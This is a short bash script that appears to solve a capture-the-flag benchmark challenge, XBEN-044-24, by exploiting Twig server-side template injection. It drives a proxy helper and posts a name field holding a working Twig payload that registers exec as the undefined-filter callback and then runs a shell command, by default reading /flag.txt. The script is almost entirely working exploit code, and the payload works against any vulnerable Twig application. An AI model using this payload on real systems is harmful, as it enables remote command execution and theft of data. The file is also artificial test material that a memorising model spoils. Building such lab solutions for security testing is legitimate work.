#!/usr/bin/env bash
# XBEN-044-24 — Twig SSTI to RCE. Proxy-mode twin. The name field is rendered by
# Twig; registering `exec` as the undefined-filter callback and then "using" a
# filter named after a shell command runs it. Here: cat /flag.txt.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
COMMAND="${2:-cat /flag.txt}"
SESSION="xben044p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/index.php"
BASE="$(req_of GET index.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/index.php' \
  --set "form.name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('$COMMAND')}}" >/dev/null
print_flag
